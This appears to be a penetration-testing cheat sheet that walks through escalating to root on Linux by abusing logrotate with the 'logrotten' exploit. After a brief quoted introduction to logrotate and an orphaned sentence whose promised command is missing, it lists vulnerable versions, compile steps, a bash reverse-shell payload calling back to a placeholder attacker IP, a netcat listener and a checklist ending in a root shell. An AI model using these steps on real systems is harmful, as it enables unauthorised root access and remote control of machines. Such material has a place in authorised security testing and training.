> Every Linux system produces large amounts of log files. To prevent the hard disk from overflowing, a tool called `logrotate` takes care of archiving or disposing of old logs.

> The logs in `/var/log` give administrators the information they need to determine the cause behind malfunctions. Almost more important are the unnoticed system details, such as whether all services are running correctly.


To force a new rotation on the same day, we can set the date after the individual log files in the status file `/var/lib/logrotate.status` or use the `-f`/`--force` option:

# Logrotate Privilege Escalation (logrotten)

## Requirements
- ✅ Write permission on the target log file.
- ✅ `logrotate` runs as **root** or another privileged user.
- ✅ Vulnerable `logrotate` versions:
  - 3.8.6
  - 3.11.0
  - 3.15.0
  - 3.18.0

## Exploit
- Use **logrotten** exploit.
- Clone & compile:
  ```bash
  git clone https://github.com/whotwagner/logrotten.git
  cd logrotten
  gcc logrotten.c -o logrotten
  ```

## Create Payload
- Example Bash reverse shell:
  ```bash
  echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' > payload
  ```

## Check logrotate Configuration
- Identify rotation method:
  ```bash
  grep "create\|compress" /etc/logrotate.conf | grep -v "#"
  ```
- Common result:
  - `create` → Use the `create` version of the exploit.

## Start Listener
```bash
nc -nlvp <PORT>
```

## Run Exploit
```bash
./logrotten -p ./payload /path/to/logfile
```

## Verify
```bash
id
```
- Successful exploitation returns:
  - `uid=0(root)`

## Quick Checklist
- [ ] Writable log file
- [ ] Vulnerable `logrotate` version
- [ ] `logrotate` executed by root
- [ ] Payload created
- [ ] Listener started
- [ ] Exploit executed
- [ ] Root shell obtained